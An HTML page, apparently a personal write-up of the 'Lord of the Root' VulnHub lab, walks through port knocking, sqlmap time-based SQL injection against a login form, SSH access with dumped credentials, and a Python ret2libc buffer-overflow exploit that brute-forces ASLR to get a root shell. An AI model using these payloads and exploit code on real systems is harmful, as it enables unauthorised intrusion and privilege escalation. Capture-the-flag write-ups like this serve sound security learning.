@@ -1,0 +1,887 @@
+<!DOCTYPE HTML>
+
+<html>
+
+
+	<head>
+		<title>Portfolio</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="/assets/css/main.css"/>
+    <link rel="stylesheet" href="/assets/css/atom-one-light.css">
+		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
+	</head>
+
+	<div class="sidebar">
+		<ul class="sidebar-list">
+		  <li class="sidebar-item"><a href="/" class="sidebar-anchor">Home</a></li>
+		  <li class="sidebar-item"><a href="/HackTheBoxNAVPAGE.html" class="sidebar-anchor">Hack The Box</a></li>
+		  <li class="sidebar-item"><a href="/Vulnhub.html" class="sidebar-anchor">Vuln Hub</a></li>
+		  <li class="sidebar-item"><a href="#" class="sidebar-anchor">Write-ups</a></li>
+		</ul>
+	  </div>
+
+<main>
+	<body class="is-preload">
+		<!-- Header -->
+			<section id="header">
+				<header>
+					<h1>Lord of the Root</h1>
+					<p>A Vulnhub box</p>
+
+			<!--SIDE NAV BAR-->
+			<div class="nav-right visible-xs">
+				<div class="button2" id="btn">
+				  <div class="bar top"></div>
+				  <div class="bar middle"></div>
+				  <div class="bar bottom"></div>
+				</div>
+			  </div>
+			  
+			 
+			  <!-- nav-right -->
+			  
+				<nav>
+				  <div class="nav-right hidden-xs">
+					<div class="button2" id="btn">
+					  <div class="bar top"></div>
+					  <div class="bar middle"></div>
+					  <div class="bar bottom"></div>
+					</div>
+				  </div>
+				  <!-- nav-right -->
+				</nav>
+			  
+				</header>
+        </section>
+	
+
+
+			<!--Search Box-->
+      <form1 id="test">
+				<input type="text" name="input" class="input1" id="search-input">
+				<button1 type="reset" class="search1" id="search-btn"></button1>
+			</form1>
+
+
+
+      <article class="container box style3 ">
+            <div id="content">
+                
+                <h1 id="lord-of-the-root">Reconnaissance</h1>
+                
+                <h2 id="nmap">NMAP</h2><br />
+                
+                <pre><code class="bash lang-bash language-bash">root@kali:~# nmap -p 22 192.168.1.80
+                Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 20:53 GMT
+                Nmap scan report for LordOfTheRoot.broadband (192.168.1.80)
+                Host is up (0.00051s latency).
+                
+                PORT   STATE SERVICE
+                22/tcp open  ssh
+                MAC Address: 00:0C:29:62:AB:76 (VMware)
+                </code></pre>
+                
+                <div class="text">
+                <p>We know it is SSH version 6.6. This is an outdated version of SSH. We could potentially perform some username enumeration,
+                  or bruteforce? Why don't we ssh in with some default creds and see what we get as this is one of the only ports available.
+                </p>
+              </div>
+
+
+                <pre><code class="bash lang-bash language-bash">root@kali:~# ssh 192.168.1.80
+                
+                                                                  .____    _____________________________
+                                                                  |    |   \_____  \__    ___/\______   \
+                                                                  |    |    /   |   \|    |    |       _/
+                                                                  |    |___/    |    \    |    |    |   \
+                                                                  |_______ \_______  /____|    |____|_  /
+                                                                          \/       \/                 \/
+                 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+                |    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+                |      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+                |    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
+                |____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
+                        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+                Easy as 1,2,3
+                </code></pre>
+                
+                <div class="text">
+                
+                <p>easy as 1,2,3 - Is this a strange hint? The header has ascii art that says knock to open. This is a 
+                  reference to Port knocking, we need to use 1,2,3 as the port knocking password.</p>
+                
+
+                <h2 id="port-knocking">Port Knocking</h2>
+                
+                <p>Port knocking is basically security through obscurity. What they have done here is hide their ports and you can only see they are open if you know their special "knock" combination. </p>
+                
+                <blockquote>
+                  <p>In this case the special knock combination was given to us in the ssh header (1,2,3)</p>
+                </blockquote>
+                
+                <p>You can port knock to unlock these hidden services with nmap and the next time you nmap should show the previously hidden ports.</p>
+                </div>
+                <pre><code class="bash lang-bash language-bash">
+                root@kali:~# nmap -r -p 1,2,3 192.168.1.80
+                Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 20:54 GMT
+                Nmap scan report for LordOfTheRoot.broadband (192.168.1.80)
+                Host is up (0.00043s latency).
+                
+                PORT  STATE    SERVICE
+                1/tcp filtered tcpmux
+                2/tcp filtered compressnet
+                3/tcp filtered compressnet
+                MAC Address: 00:0C:29:62:AB:76 (VMware)
+                </code></pre>
+
+                <div class="text">
+                <p>I already knew port 1337 was going to be open so just to save time i only scanned that one, however before this i performed the full nmap that showed this was the port that was open.</p>
+                </div>
+
+
+                <pre><code class="bash lang-bash language-bash">
+                Nmap done: 1 IP address (1 host up) scanned in 14.28 seconds
+                root@kali:~# nmap -p 1337 192.168.16.137
+                Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 21:25 GMT
+                Nmap scan report for 192.168.16.137
+                Host is up (0.00040s latency).
+                
+                PORT     STATE SERVICE
+                1337/tcp open  waste
+                MAC Address: 00:0C:29:62:AB:76 (VMware)
+                </code></pre>
+                
+
+                <div class="text">
+                
+                <p>This revealed port 1337 is open. What is waste? <blockquote><p> Waste is a file manager</p> </blockquote>
+                further research shows its a web server. Let's open this up in a web browser. First thing i check is for a robots.txt file. This shows a base64 string
+                We can decode this with cyberchef</p>
+                
+                <blockquote>
+                  <p>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh<br />
+                  Lzk3ODM0NTIxMC9pbmRleC5waHA --> That gave us "Closer!
+                  /978345210/index.php"</p>
+                </blockquote>
+
+                <p>This new URL directory takes us to a login page. Lets see if its vulnerable to SQL Injection. I am
+                  going to throw it into SQL map and see what we get. Seems as though it vulnerable to a blind time based
+                  SQL injection. This should allow us to dump the database and get some user credentials</p>
+                </div>
+                
+                <h2 id="blind-time-based-sql-injection">Blind Time based SQL Injection</h2>
+                <br />
+                <pre><code class="bash lang-bash language-bash">root@kali:~# sqlmap -u http://192.168.16.137:1337//978345210/index.php --dump --forms
+                        ___
+                       __H__
+                 ___ ___[,]_____ ___ ___  {1.4.12#stable}
+                |_ -| . [,]     | .'| . |
+                |___|_  [']_|_|_|__,|  _|
+                      |_|V...       |_|   http://sqlmap.org
+                
+                [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+                
+                [*] starting @ 14:26:20 /2020-12-29/
+                
+                [14:26:20] [INFO] testing connection to the target URL
+                you have not declared cookie(s), while server wants to set its own ('PHPSESSID=aaij4i7qr95...0lgefnffr5'). Do you want to use those [Y/n] 
+                [14:26:22] [INFO] searching for forms
+                [#1] form:
+                POST http://192.168.16.137:1337//978345210/index.php
+                POST data: username=&password=&submit=%20Login%20
+                do you want to test this form? [Y/n/q] 
+                > 
+                Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): 
+                do you want to fill blank fields with random values? [Y/n] 
+                it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] 
+                [14:26:25] [INFO] resuming back-end DBMS 'mysql' 
+                [14:26:25] [INFO] using '/root/.sqlmap/output/results-12292020_0226pm.csv' as the CSV results file in multiple targets mode
+                sqlmap resumed the following injection point(s) from stored session:
+                ---
+                Parameter: password (POST)
+                    Type: time-based blind
+                    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+                    Payload: username=ExQW&password=' AND (SELECT 3425 FROM (SELECT(SLEEP(5)))apKx) AND 'VqnW'='VqnW&submit= Login
+                ---
+                do you want to exploit this SQL injection? [Y/n] 
+                [14:26:26] [INFO] the back-end DBMS is MySQL
+                back-end DBMS: MySQL >= 5.0.12
+                [14:26:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+                [14:26:26] [INFO] fetching current database
+                [14:26:26] [INFO] resumed: Webapp
+                [14:26:26] [INFO] fetching tables for database: 'Webapp'
+                [14:26:26] [INFO] fetching number of tables for database 'Webapp'
+                [14:26:26] [INFO] resumed: 1
+                [14:26:26] [INFO] resumed: Users
+                [14:26:26] [INFO] fetching columns for table 'Users' in database 'Webapp'
+                [14:26:26] [INFO] resumed: 3
+                [14:26:26] [INFO] resumed: id
+                [14:26:26] [INFO] resumed: username
+                [14:26:26] [INFO] resumed: password
+                [14:26:26] [INFO] fetching entries for table 'Users' in database 'Webapp'
+                [14:26:26] [INFO] fetching number of entries for table 'Users' in database 'Webapp'
+                [14:26:26] [INFO] resumed: 5
+                [14:26:26] [INFO] resumed: 1
+                [14:26:26] [INFO] resumed: iwilltakethering
+                [14:26:26] [INFO] resumed: frodo
+                [14:26:26] [INFO] resumed: 2
+                [14:26:26] [INFO] resumed: MyPreciousR00t
+                [14:26:26] [INFO] resumed: smeagol
+                [14:26:26] [INFO] resumed: 3
+                [14:26:26] [INFO] resumed: AndMySword
+                [14:26:26] [INFO] resumed: aragorn
+                [14:26:26] [INFO] resumed: 4
+                [14:26:26] [INFO] resumed: AndMyBow
+                [14:26:26] [INFO] resumed: legolas
+                [14:26:26] [INFO] resumed: 5
+                [14:26:26] [INFO] resumed: AndMyAxe
+                [14:26:26] [INFO] resumed: gimli
+                Database: Webapp
+                Table: Users
+                [5 entries]
+                +----+------------------+----------+
+                | id | password         | username |
+                +----+------------------+----------+
+                | 1  | iwilltakethering | frodo    |
+                | 2  | MyPreciousR00t   | smeagol  |
+                | 3  | AndMySword       | aragorn  |
+                | 4  | AndMyBow         | legolas  |
+                | 5  | AndMyAxe         | gimli    |
+                +----+------------------+----------+
+                
+                [14:26:26] [INFO] table 'Webapp.Users' dumped to CSV file '/root/.sqlmap/output/192.168.16.137/dump/Webapp/Users.csv'
+                [14:26:26] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-12292020_0226pm.csv'
+                </code></pre>
+                
+                <br />
+                <h2 id="foothold">Foothold!</h2>
+
+                <div class="text">
+                <p>So we got a password and some users.<br />
+                Lets try these with SSH to get a foothold on the system.</p>
+                </div>
+
+                <pre><code class="bash lang-bash language-bash">smeagol@LordOfTheRoot:/$ ls
+                bin  boot  cdrom  dev  etc  home  initrd.img  lib  lost+found  media  mnt  opt  proc  root  run  sbin  SECRET  srv  sys  tmp  usr  var  vmlinuz
+                smeagol@LordOfTheRoot:/$ cd SECRET/
+                smeagol@LordOfTheRoot:/SECRET$ ls
+                door1  door2  door3
+                smeagol@LordOfTheRoot:/SECRET$ cd door1
+                smeagol@LordOfTheRoot:/SECRET/door1$ ls
+                file
+                smeagol@LordOfTheRoot:/SECRET/door1$ cd ..
+                smeagol@LordOfTheRoot:/SECRET$ md5sum */file
+                f0c663095117d908e16412570d2c6252  door1/file
+                bb0e0e4439b5039e71405f8a1b6d5c0c  door2/file
+                f0c663095117d908e16412570d2c6252  door3/file
+                smeagol@LordOfTheRoot:/SECRET$ 
+                smeagol@LordOfTheRoot:/SECRET$ cd door2
+                smeagol@LordOfTheRoot:/SECRET/door2$ ./file 
+                Syntax: ./file <input string>
+                smeagol@LordOfTheRoot:/SECRET/door2$ ./file a
+                smeagol@LordOfTheRoot:/SECRET/door2$ 
+                
+                </code></pre>
+                
+                <div class="text">
+                  <p>
+                The creds worked with SSH! So after searching around i found a directory called "SECRET" (i wonder what 
+                might be in here). Looks like all this program is doing is taking in user input. hmmm. Perhaps we can overflow this program?
+                Lets take a look at what it is actually doing by dumping the source code.
+                  </p>
+                </div>
+                
+                <pre><code class="bash lang-bash language-bash">[0x08048360]> s main
+                [0x0804845d]> pdf
+                            ; DATA XREF from entry0 @ 0x8048377
+                ┌ 82: int main (signed int arg_8h, int32_t arg_ch);
+                │           ; arg signed int arg_8h @ ebp+0x8
+                │           ; arg int32_t arg_ch @ ebp+0xc
+                │           ; var char *src @ esp+0x4
+                │           ; var char *dest @ esp+0x11
+                │           0x0804845d      55             push ebp
+                │           0x0804845e      89e5           mov ebp, esp
+                │           0x08048460      83e4f0         and esp, 0xfffffff0
+                │           0x08048463      81ecb0000000   sub esp, 0xb0
+                │           0x08048469      837d0801       cmp dword [arg_8h], 1
+                │       ┌─< 0x0804846d      7f21           jg 0x8048490
+                │       │   0x0804846f      8b450c         mov eax, dword [arg_ch]
+                │       │   0x08048472      8b00           mov eax, dword [eax]
+                │       │   0x08048474      89442404       mov dword [src], eax
+                │       │   0x08048478      c70424408504.  mov dword [esp], str.Syntax:__s__input_string ; [0x8048540:4]=0x746e7953 ; "Syntax: %s <input string>\n" ; const char *format
+                │       │   0x0804847f      e88cfeffff     call sym.imp.printf         ; int printf(const char *format)
+                │       │   0x08048484      c70424000000.  mov dword [esp], 0          ; int status
+                │       │   0x0804848b      e8b0feffff     call sym.imp.exit           ; void exit(int status)
+                │       │   ; CODE XREF from main @ 0x804846d
+                │       └─> 0x08048490      8b450c         mov eax, dword [arg_ch]
+                │           0x08048493      83c004         add eax, 4
+                │           0x08048496      8b00           mov eax, dword [eax]
+                │           0x08048498      89442404       mov dword [src], eax        ; const char *src
+                │           0x0804849c      8d442411       lea eax, dword [dest]
+                │           0x080484a0      890424         mov dword [esp], eax        ; char *dest
+                │           0x080484a3      e878feffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
+                │           0x080484a8      b800000000     mov eax, 0
+                │           0x080484ad      c9             leave
+                └           0x080484ae      c3             ret
+                [0x0804845d]> 
+                </code></pre>
+                
+                <div class="text">
+                <p> I opened up the program in radare2 and had a look at the main function which literally only took in user 
+                input. This defintley directs us to a buffer overflow, especially if there is no checking of string 
+                lengths from the user.</p>
+                
+            
+                <p>I cross referenced this with Ghydra to take a look at its c code representation which confirmed there 
+                  are no checks when it copys user input to its buffer.</p>
+
+                </div>
+
+                <h2 id="buffer-overflow">Buffer Overflow</h2><br />
+                
+                <pre><code class="typescript  lang-typescript  language-typescript ">gef➤  run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+                Starting program: /root/Documents/lordOfTheRoot/fileNew aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+                
+                Program received signal SIGSEGV, Segmentation fault.
+                0x61617362 in ?? ()
+                
+                [ Legend: Modified register | Code | Heap | Stack | String ]
+                ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+                $eax   : 0x0       
+                $ebx   : 0x0       
+                $ecx   : 0xffffda50  →  "bxaabyaab"
+                $edx   : 0xffffd750  →  "bxaabyaab"
+                $esp   : 0xffffd740  →  "btaabuaabvaabwaabxaabyaab"
+                $ebp   : 0x61617262 ("braa"?)
+                $esi   : 0xf7fb2000  →  0x001dfd6c
+                $edi   : 0xf7fb2000  →  0x001dfd6c
+                $eip   : 0x61617362 ("bsaa"?)
+                $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+                $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+                ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+                0xffffd740│+0x0000: "btaabuaabvaabwaabxaabyaab"  ← $esp
+                0xffffd744│+0x0004: "buaabvaabwaabxaabyaab"
+                0xffffd748│+0x0008: "bvaabwaabxaabyaab"
+                0xffffd74c│+0x000c: "bwaabxaabyaab"
+                0xffffd750│+0x0010: "bxaabyaab"
+                0xffffd754│+0x0014: "byaab"
+                0xffffd758│+0x0018: 0xf7fb0062  →  0x100e4103
+                0xffffd75c│+0x001c: 0x00000000
+                ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+                [!] Cannot disassemble from $PC
+                [!] Cannot access memory at address 0x61617362
+                ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+                [#0] Id 1, Name: "fileNew", stopped 0x61617362 in ?? (), reason: SIGSEGV
+                ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+                gef➤  pattern search $eip
+                [+] Searching '$eip'
+                [+] Found at offset 171 (little-endian search) likely
+                gef➤  pattern search 0xffffd740
+                [+] Searching '0xffffd740'
+                [+] Found at offset 175 (little-endian search) likely
+                gef➤  pattern search bsaa
+                [+] Searching 'bsaa'
+                [+] Found at offset 171 (big-endian search) 
+                gef➤  pattern search btaabuaabvaabwaabxaabyaab
+                [+] Searching 'btaabuaabvaabwaabxaabyaab'
+                [+] Found at offset 175 (big-endian search) 
+                
+                </code></pre>
+                
+                <div class="text">
+                  <p>
+                I opened the program in GDB using the GEF plugin. I generated a string that would overflow the buffer.
+                From the seg fault, looking at the eip register we can see the program overlows at 171 (170 it runs normally)
+                So we need to fuzz the stack up to this EIP register (instruction pointer). Once we have reached the EIP 
+                we can dump a malicious payload which will execute shell code with elevated priviledges. We are only available
+                to drop shell code on the stack as the stack smashing protections are disabled (more on this later).
+                  </p>
+                </div>
+
+                <h1 id="aslr-bypass">ASLR Bypass</h1>
+
+                <div class="text">
+                  <p>
+                From running this program a few times i found ASLR was enabled.<br />
+                ASLR randomizes the address of libc everytime the program is ran. If we try to overwrite the EIP with 
+                the address of our payload then it will not work as the address of the EIP will be different each time
+                the program is executed.<br /><br />
+
+                We can use a simple command to check if any other stack protections are on "checksec".
+                  </p>
+
+                </div>
+
+
+                <pre><code class="bash lang-bash language-bash">[+] checksec for '/root/Documents/lordOfTheRoot/fileNew'
+                Canary                        : ✘ 
+                NX                            : ✘ 
+                PIE                           : ✘ 
+                Fortify                       : ✘ 
+                RelRO                         : ✘ 
+                </code></pre>
+                
+                <div class="text">
+                  <p>No NX or stack canaries (yay!). NX is a bit on a bianry that prevents code from being directly executed
+                    on the stack, preventing from things like this. There are ways to bypass it through Return Oritneted Programming
+                    but we don't need to worry about that.
+                  </p>
+                </div>
+
+                <pre><code class="bash lang-bash language-bash">root@kali:~/Documents/lordOfTheRoot# while true; do ldd ./fileNew; done | grep libc
+                    libc.so.6 => /lib32/libc.so.6 (0xf7cd4000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7dae000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7cd9000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d63000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d5b000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d36000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d28000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d05000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d33000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d7e000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7dcf000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7dc4000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d70000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d53000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7ce9000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7dc2000)
+                    libc.so.6 => /lib32/libc.so.6 (0xf7d43000)
+                </code></pre>
+                
+                <div class="text">
+                  <p>
+                A quick bash script executing the ldd command on the binary multiple times. ldd is responsible for printing
+                shared libraries in the binary (in this case libc) which proves ASLR is on.
+                Although libc is changing its address in memory, it is only changing integers at position 3,4,5 and digit
+                3 is only swapping between c and d (shows it is only a 32 bit binary)<br />
+                This means we only have 512 possible combinations for addresses of libc (2 * 16 * 16 = 512)<br />
+                We could brute force this.
+                  </p>
+                </div>
+
+                <h2 id="bruteforce-libc">Bruteforce Libc</h2>
+                
+                <div class="text">
+                <p>
+                Before we brute force libc we need to find the offset of /bin/sh, system and exit. (libc base address + address in memory)
+                </p>
+                
+                <p>Getting any address for libc</p>
+                </div>
+
+
+                <pre><code class="bash lang-bash language-bash">meagol@LordOfTheRoot:/SECRET/door1$ while true; do ldd ./file; done | grep libc
+                    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75bd000)
+                    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7555000)
+                    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb753e000)
+                    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 
+                </code></pre>
+                
+                <br /><h2 id="sys call offset">Getting Sys call offset</h2>
+
+                <div class="text">
+                  <p>
+                  We need to find where "system()" is located in the libc library so we can run /bin/sh to drop a shell.
+                  Since we are using system() it will run with elevated privileges getting us root.
+                  </p>
+      
+                  </div>
+                
+                <pre><code class="bash lang-bash language-bash">
+                smeagol@LordOfTheRoot:~/Documents$ readelf -a /lib/i386-linux-gnu/libc.so.6 | grep system
+                   243: 00119240    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
+                   620: 00040190    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+                  1443: 00040190    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+                smeagol@LordOfTheRoot:~/Documents$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+                 160a24 /bin/sh
+                smeagol@LordOfTheRoot:~/Documents$ readelf -a /lib/i386-linux-gnu/libc.so.6 | grep exit
+                  [25] __libc_atexit     PROGBITS        001a8260 1a8260 000004 00  WA  0   0  4
+                   03     .tdata .init_array __libc_subfreeres __libc_atexit __libc_thread_subfreeres .data.rel.ro .dynamic .got .got.plt .data .bss 
+                   09     .tdata .init_array __libc_subfreeres __libc_atexit __libc_thread_subfreeres .data.rel.ro .dynamic .got 
+                001a9eec  00056406 R_386_GLOB_DAT    001aa204   argp_err_exit_status
+                001a9fa4  00082706 R_386_GLOB_DAT    001aa154   obstack_exit_failure
+                   111: 00033610    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
+                   139: 000331e0    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
+                   446: 00033650   268 FUNC    GLOBAL DEFAULT   12 __cxa_thread_atexit_impl@@GLIBC_2.18
+                   554: 000b5bc4    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
+                   609: 0011c120    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
+                   645: 000335e0    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
+                   868: 00033410    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
+                  1037: 00126970    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
+                  1380: 001aa204     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
+                  1491: 000f8e30    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
+                  2087: 001aa154     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
+                  2240: 00033210    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
+                  2383: 000f99a0     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
+                
+                </code></pre>
+                
+                <br /><h2 id="exit offset">Getting exit offset</h2>
+
+                <div class="text">
+                  <p>
+                  Once we have dropped our shell we need to exit the program so it doesn't crash. By using readelf 
+                  i can display information about the ELF format of object files. It is similar to objdump except
+                  it goes into a bit more detail, basically it wil show us where in memory the necessary library 
+                  functions sit. <br /><br />
+                  
+                  So if we run readelf and grep for the necessary function it should give us
+                  the offset. Since the offset doesn't change only the libc base address does we don't need
+                  to find these on runtime or brute force them.
+                  </p>
+                  
+                  </div>
+                
+                <pre><code class="bash lang-bash language-bash">smeagol@LordOfTheRoot:~/Documents$ readelf -a /lib/i386-linux-gnu/libc.so.6 | grep exit
+                  [25] __libc_atexit     PROGBITS        001a8260 1a8260 000004 00  WA  0   0  4
+                   03     .tdata .init_array __libc_subfreeres __libc_atexit __libc_thread_subfreeres .data.rel.ro .dynamic .got .got.plt .data .bss 
+                   09     .tdata .init_array __libc_subfreeres __libc_atexit __libc_thread_subfreeres .data.rel.ro .dynamic .got 
+                001a9eec  00056406 R_386_GLOB_DAT    001aa204   argp_err_exit_status
+                001a9fa4  00082706 R_386_GLOB_DAT    001aa154   obstack_exit_failure
+                   111: 00033610    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
+                   139: 000331e0    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
+                   446: 00033650   268 FUNC    GLOBAL DEFAULT   12 __cxa_thread_atexit_impl@@GLIBC_2.18
+                   554: 000b5bc4    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
+                   609: 0011c120    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
+                   645: 000335e0    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
+                   868: 00033410    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
+                  1037: 00126970    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
+                  1380: 001aa204     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
+                  1491: 000f8e30    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
+                  2087: 001aa154     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
+                  2240: 00033210    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
+                  2383: 000f99a0     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
+                
+                
+                </code></pre>
+                
+                <br /><h2 id="/bin/sh">Getting /bin/sh offset</h2><br />
+
+                <div class="text">
+                  <p>
+                  You may have noticed we are not using readelf this time. That is because /bin/sh can
+                  be found inside the libc binary itself, therefore can be found with a quick strings search.
+                  </p>
+                  
+                  </div>
+                
+                <pre><code class="bash lang-bash language-bash">smeagol@LordOfTheRoot:~/Documents$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+                 160a24 /bin/sh
+                </code></pre>
+                
+                <div class="text">
+
+                <p>Now we need to Write a Python script for the payload<br />
+                We are using the system function to call /bin/sh which will run the shell with elevated priviledges, getting us root.
+                We also need to call exit to prevent the application from crashing once we exit the shell.</p>
+                </div>
+
+                <pre><code class="python lang-python language-python">from subprocess import call
+                from struct import pack
+                
+                
+                fuzz = "\x90"*171
+                baseAddr = 0xb751c000
+                sys = pack("I",baseAddr+0x00040190)
+                ex = pack("I",baseAddr+0x000331e0)
+                shell=pack("I",baseAddr+0x160a24)
+                payload = fuzz + sys + ex + shell
+                
+                for i in range(512):
+                    print(i)
+                    call(["/SECRET/door2/file", payload])
+                
+                </code></pre>
+                <div class="text">
+
+                  <p>So, simple script. I have specified the offset of NOPs to fuzz the stack up to the instruction pointer 
+                    (EIP). I have specified the base address for libc so then we can point to our libc functions like /bin/sh.
+                    I have also specified the sys call functions address relative to the offset from the base libc address, as well
+                    as exit and the /bin/sh function. <br /><br />
+                    
+                    Since i calculater earlier there are only 512 combinations of libc base addresses
+                    i need to run the code a maximum of 512 times, maybe less depending when the binary uses my specified base address.
+                  </p>
+                  </div>
+
+
+                <pre><code class="bash lang-bash language-bash">smeagol@LordOfTheRoot:~/Documents$ python payload.py 
+                0
+                1
+                file: ../iconv/skeleton.c:416: __gconv_transform_internal_ucs2: Assertion `outbufstart == ((void *)0)' failed.
+                2
+                3
+                4
+                5
+                6
+                7
+                8
+                9
+                10
+                11
+                12
+                13
+                14
+                15
+                16
+                17
+                18
+                19
+                20
+                21
+                22
+                23
+                24
+                25
+                26
+                27
+                28
+                29
+                30
+                31
+                32
+                33
+                34
+                35
+                36
+                37
+                38
+                39
+                40
+                41
+                42
+                43
+                44
+                45
+                46
+                47
+                48
+                49
+                50
+                51
+                52
+                53
+                54
+                55
+                56
+                file: ../iconv/skeleton.c:416: __gconv_transform_internal_ucs2: Assertion `outbufstart == ((void *)0)' failed.
+                57
+                58
+                59
+                60
+                61
+                62
+                63
+                64
+                65
+                66
+                67
+                68
+                69
+                70
+                71
+                72
+                73
+                74
+                75
+                76
+                77
+                78
+                79
+                80
+                81
+                82
+                83
+                84
+                85
+                86
+                87
+                88
+                89
+                90
+                91
+                92
+                93
+                94
+                95
+                96
+                97
+                98
+                99
+                100
+                101
+                102
+                103
+                104
+                105
+                106
+                107
+                108
+                109
+                110
+                111
+                112
+                113
+                114
+                115
+                116
+                117
+                118
+                119
+                120
+                121
+                122
+                123
+                124
+                125
+                126
+                127
+                128
+                129
+                130
+                131
+                132
+                133
+                134
+                135
+                136
+                137
+                file: ../iconv/skeleton.c:416: __gconv_transform_internal_ucs2: Assertion `outbufstart == ((void *)0)' failed.
+                138
+                139
+                140
